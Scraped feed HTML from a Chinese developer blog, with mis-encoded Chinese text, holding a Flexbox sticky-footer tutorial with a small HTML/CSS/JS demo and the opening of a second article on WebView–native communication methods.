                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1. ç°è±¡æè¿° (The Problem)</h3>
<p>åœ¨å¼€å‘ H5 æˆ– Web é¡µé¢æ—¶ï¼Œç»å¸¸é‡åˆ°ä»¥ä¸‹ä¸¤ç§å°´å°¬åœºæ™¯ï¼š</p>
<ul>
<li><strong>åœºæ™¯ Aï¼ˆå†…å®¹è¿‡çŸ­ï¼‰</strong> ï¼šå½“é¡µé¢å†…å®¹ï¼ˆContentï¼‰å¾ˆå°‘ï¼Œä¸è¶³ä»¥æ’‘æ»¡å±å¹•é«˜åº¦æ—¶ï¼ŒFooter ä¼šâ€œæµ®â€åœ¨å±å¹•ä¸­é—´ï¼Œåº•éƒ¨ç•™å‡ºä¸€å¤§ç‰‡éš¾çœ‹çš„ç©ºç™½ã€‚</li>
</ul>

<ul>
<li><strong>åœºæ™¯ Bï¼ˆå†…å®¹è¿‡é•¿ï¼‰</strong> ï¼šå½“é¡µé¢å†…å®¹å¾ˆå¤šæ—¶ï¼ŒFooter åº”è¯¥è¢«æ¨åˆ°é¡µé¢æœ€åº•éƒ¨ï¼Œéœ€è¦æ»šåŠ¨åˆ°åº•éƒ¨æ‰èƒ½çœ‹åˆ°ã€‚</li>
</ul>
<p>æˆ‘ä»¬éœ€è¦çš„æ•ˆæœæ˜¯ï¼š</p>
<p>æ— è®ºå†…å®¹é•¿çŸ­ï¼ŒFooter æ°¸è¿œåœ¨è§†å£çš„æœ€åº•éƒ¨ï¼Œæˆ–è€…å†…å®¹çš„ä¸‹æ–¹ï¼ˆå¦‚æœå†…å®¹è¶…å‡ºä¸€å±ï¼‰ã€‚ è¿™å°±æ˜¯ Sticky Footerã€‚</p>
<h3 data-id="heading-1">2. åŸç†è§£æ (The Principle)</h3>
<p>åœ¨ Flexbox æ™®åŠä¹‹å‰ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨è´Ÿ margin æˆ–ç»å¯¹å®šä½ï¼ˆÂ position: absoluteÂ ï¼‰æ¥ hackï¼Œä½†å…¼å®¹æ€§å·®ä¸”å®¹æ˜“è¦†ç›–å†…å®¹ã€‚</p>
<p>ç°åœ¨æœ€ç°ä»£ã€æœ€ä¼˜é›…çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨ <strong>Flexbox å¸ƒå±€</strong>ã€‚</p>
<h4 data-id="heading-2">æ ¸å¿ƒä¸‰æ­¥èµ°ï¼š</h4>
<ol>
<li><strong>å®¹å™¨å®šé«˜</strong>ï¼šå°†æœ€å¤–å±‚å®¹å™¨ï¼ˆWrapperï¼‰è®¾ç½®ä¸º Flex å®¹å™¨ï¼Œæ–¹å‘ä¸ºåˆ—ï¼ˆColumnï¼‰ï¼Œå¹¶å¼ºåˆ¶æœ€å°é«˜åº¦ä¸ºè§†å£é«˜åº¦ï¼ˆÂ min-height: 100vhÂ ï¼‰ã€‚è¿™ä¿è¯äº†é¡µé¢è‡³å°‘æœ‰ä¸€å±é«˜ã€‚</li>
</ol>

<ol start="2">
<li><strong>å¼¹æ€§å¸ƒå±€</strong>ï¼šè®¾ç½® Â display: flex; flex-direction: column;Â ã€‚</li>
</ol>

<ol start="3">
<li><strong>æ’‘å¼€å‰©ä½™ç©ºé—´</strong>ï¼š</li>
</ol>
<ul>
<li><strong>æ–¹æ³•ä¸€ï¼ˆæ¨èï¼‰</strong> ï¼šç»™ä¸­é—´çš„<strong>å†…å®¹åŒºåŸŸ</strong>ï¼ˆContentï¼‰è®¾ç½® Â flex: 1Â ã€‚è¿™è¡¨ç¤ºâ€œè‡ªåŠ¨å æ®å‰©ä½™çš„æ‰€æœ‰ç©ºé—´â€ã€‚å½“å†…å®¹çŸ­æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨ä¼¸é•¿æŠŠ Footer é¡¶åˆ°åº•éƒ¨ï¼›å½“å†…å®¹é•¿æ—¶ï¼Œå®ƒæŒ‰å®é™…é«˜åº¦æ¸²æŸ“ã€‚</li>
</ul>

<ul>
<li><strong>æ–¹æ³•äºŒï¼ˆæˆ‘ä»¬åœ¨ä»£ç ä¸­ç”¨çš„ï¼‰</strong> ï¼šç»™ <strong>Footer</strong> è®¾ç½® Â margin-top: autoÂ ã€‚åœ¨ Flex å®¹å™¨ä¸­ï¼Œè‡ªåŠ¨è¾¹è·ä¼šå¸æ”¶å‰©ä½™ç©ºé—´ï¼ŒæŠŠå…ƒç´ æ¨åˆ°å¦ä¸€ç«¯ã€‚</li>
</ul>
<h3 data-id="heading-3">3. ä»£ç å®æˆ˜ Demo (The Solution)</h3>
<p>è¿™æ˜¯ä¸€ä¸ªæœ€å°åŒ–çš„ HTML/CSS æ¼”ç¤ºï¼Œæ‚¨å¯ä»¥å¤åˆ¶ä¿å­˜ä¸º Â .htmlÂ  æ–‡ä»¶ç›´æ¥è¿è¡ŒæŸ¥çœ‹æ•ˆæœã€‚</p>
<p>HTML</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Sticky Footer Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-comment">/* 1. å…¨å±€é‡ç½®ï¼Œé˜²æ­¢é»˜è®¤è¾¹è·å¹²æ‰° */</span>
        <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">font-family</span>: sans-serif; }


        <span class="hljs-comment">/* === [æ ¸å¿ƒå¸ƒå±€ä»£ç  Start] === */</span>
        
        <span class="hljs-comment">/* å®¹å™¨ï¼šè®¾ä¸º Flex åˆ—å¸ƒå±€ï¼Œä¸”è‡³å°‘å æ»¡ä¸€å± */</span>
        <span class="hljs-selector-class">.app-container</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">flex-direction</span>: column;
            <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>; 
        }


        <span class="hljs-comment">/* é¡¶éƒ¨ Header */</span>
        <span class="hljs-selector-tag">header</span> {
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#333</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">text-align</span>: center;
        }


        <span class="hljs-comment">/* ä¸­é—´å†…å®¹åŒºï¼šå…³é”®ç‚¹ï¼ */</span>
        <span class="hljs-selector-tag">main</span> {
            <span class="hljs-comment">/* flex: 1 è®©å®ƒè‡ªåŠ¨ä¼¸ç¼©ï¼Œå æ®é™¤å» Header å’Œ Footer ä¹‹å¤–çš„æ‰€æœ‰å‰©ä½™ç©ºé—´ */</span>
            <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>; 
            
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f0f0f0</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
        }


        <span class="hljs-comment">/* åº•éƒ¨ Footer */</span>
        <span class="hljs-selector-tag">footer</span> {
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#70b62c</span>; <span class="hljs-comment">/* å“ç‰Œç»¿ */</span>
            <span class="hljs-attribute">color</span>: white;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">text-align</span>: center;
        }
        
        <span class="hljs-comment">/* === [æ ¸å¿ƒå¸ƒå±€ä»£ç  End] === */</span>


        <span class="hljs-comment">/* ä»…ç”¨äºæ¼”ç¤ºçš„æŒ‰é’®æ ·å¼ */</span>
        <span class="hljs-selector-tag">button</span> { <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">20px</span>; <span class="hljs-attribute">cursor</span>: pointer; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;}
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>


    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app-container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>
            æˆ‘æ˜¯ Header
        <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>


        <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æˆ‘æ˜¯ä¸»è¦å†…å®¹åŒºåŸŸ<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å½“å‰å†…å®¹è¾ƒå°‘ï¼Œä½ çœ‹ Footer ä¾ç„¶åœ¨æœ€åº•éƒ¨ï¼Œæ²¡æœ‰æµ®ä¸Šæ¥ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä½ å¯ä»¥ç‚¹å‡»ä¸‹é¢æŒ‰é’®å¢åŠ å†…å®¹æµ‹è¯•ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"addContent()"</span>&gt;</span>å¢åŠ å†…å®¹ï¼ˆæ¨¡æ‹Ÿé•¿é¡µé¢ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"resetContent()"</span>&gt;</span>é‡ç½®å†…å®¹ï¼ˆæ¨¡æ‹ŸçŸ­é¡µé¢ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"extra-text"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>


        <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>
            æˆ‘æ˜¯ Footer (Sticky Layout)
            <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
            æ— è®ºå†…å®¹å¤šå°‘ï¼Œæˆ‘éƒ½åœ¨åº•éƒ¨
        <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>


    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">addContent</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'extra-text'</span>);
            <span class="hljs-keyword">let</span> html = <span class="hljs-string">''</span>;
            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">20</span>; i++) {
                html += <span class="hljs-string">'&lt;p&gt;è¿™æ˜¯ä¸€æ®µå¾ˆé•¿çš„æµ‹è¯•å†…å®¹ï¼Œç”¨æ¥æ’‘å¼€é¡µé¢é«˜åº¦... '</span> + i + <span class="hljs-string">'&lt;/p&gt;'</span>;
            }
            div.<span class="hljs-property">innerHTML</span> = html;
        }
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">resetContent</span>(<span class="hljs-params"/>) {
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'extra-text'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">''</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>Plain Text</p>
<h3 data-id="heading-4">4. ä¸ºä»€ä¹ˆä¸ç”¨ Â position: fixedÂ ?</h3>
<p>å¾ˆå¤šåˆå­¦è€…ä¼šæŠŠ Footer è®¾ä¸º Â position: fixed; bottom: 0;Â ã€‚</p>
<ul>
<li><strong>ç¼ºç‚¹</strong>ï¼šè¿™æ˜¯<strong>å›ºå®šå®šä½</strong>ã€‚Footer ä¼šæ°¸è¿œæ‚¬æµ®åœ¨å±å¹•ä¸‹æ–¹ï¼Œåƒè´´äº†ä¸€å—è†è¯ã€‚å¦‚æœé¡µé¢å†…å®¹å¾ˆé•¿ï¼Œå†…å®¹ä¼šè¢«è¿™å—è†è¯æŒ¡ä½ï¼Œå¯¼è‡´æœ€åº•ä¸‹çš„æ–‡å­—çœ‹ä¸è§ã€‚</li>
</ul>

<ul>
<li><strong>Sticky Footer ä¼˜ç‚¹</strong>ï¼šå®ƒæ˜¯<strong>æµå¼å¸ƒå±€</strong>ã€‚å†…å®¹çŸ­æ—¶å®ƒåœ¨åº•éƒ¨ï¼›å†…å®¹é•¿æ—¶ï¼Œå®ƒåœ¨å†…å®¹çš„ä¸‹é¢ï¼Œä¸ä¼šé®æŒ¡ä»»ä½•ä¿¡æ¯ã€‚</li>
</ul>
<hr/>
<p>ä¸€å¥è¯æ€»ç»“ï¼š</p>
<p>å®¹å™¨ min-height: 100vh + Flex å¸ƒå±€ï¼Œé…åˆå†…å®¹åŒº flex: 1ï¼Œæ˜¯ç›®å‰å®ç° Sticky Footer æœ€æ ‡å‡†ã€å…¼å®¹æ€§æœ€å¥½çš„æ–¹æ¡ˆã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[jsbridgeã€postMessageã€schemeä¸‰ç§é€šä¿¡æ–¹å¼çš„åŒºåˆ«å’Œå®‰å“ioså®ç°æ–¹å¼]]></title>    <link>https://juejin.cn/post/7594383365418483758</link>    <guid>https://juejin.cn/post/7594383365418483758</guid>    <pubDate>2026-01-13T02:32:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594383365418483758" data-draft-id="7594383365418434606" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="jsbridgeã€postMessageã€schemeä¸‰ç§é€šä¿¡æ–¹å¼çš„åŒºåˆ«å’Œå®‰å“ioså®ç°æ–¹å¼"/> <meta itemprop="keywords" content="WebView"/> <meta itemprop="datePublished" content="2026-01-13T02:32:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èœèœOvO"/> <meta itemprop="url" content="https://juejin.cn/user/2509555820920986"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            jsbridgeã€postMessageã€schemeä¸‰ç§é€šä¿¡æ–¹å¼çš„åŒºåˆ«å’Œå®‰å“ioså®ç°æ–¹å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2509555820920986/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èœèœOvO
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:32:59.000Z" title="Tue Jan 13 2026 02:32:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ··åˆå¼€å‘ï¼ˆHybrid Appï¼‰ä¸­ï¼Œ<strong>Web ä¸ Nativeï¼ˆAndroid/iOSï¼‰ä¹‹é—´çš„é€šä¿¡</strong>æ˜¯æ ¸å¿ƒéœ€æ±‚ã€‚å¸¸è§çš„ä¸‰ç§é€šä¿¡æ–¹å¼æ˜¯ï¼š</p>
<ol>
<li><strong>JSBridgeï¼ˆåŸºäºÂ <code>addJavascriptInterface</code>Â /Â <code>WKScriptMessageHandler</code>ï¼‰</strong></li>
<li><strong><code>postMessage</code>Â +Â <code>MessageChannel</code>ï¼ˆç°ä»£ WebView é€šä¿¡ï¼‰</strong></li>
<li><strong>URL Schemeï¼ˆæ‹¦æˆªè‡ªå®šä¹‰åè®®ï¼‰</strong></li>
</ol>
<p>ä¸‹é¢ä» <strong>åŸç†ã€åŒºåˆ«ã€å®‰å…¨æ€§ã€å¹³å°å®ç°</strong> ç­‰ç»´åº¦è¯¦ç»†å¯¹æ¯”ï¼Œå¹¶ç»™å‡º Android å’Œ iOS çš„å®ç°æ–¹å¼ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¸‰ç§æ–¹å¼æ¦‚è§ˆå¯¹æ¯”</h2>















































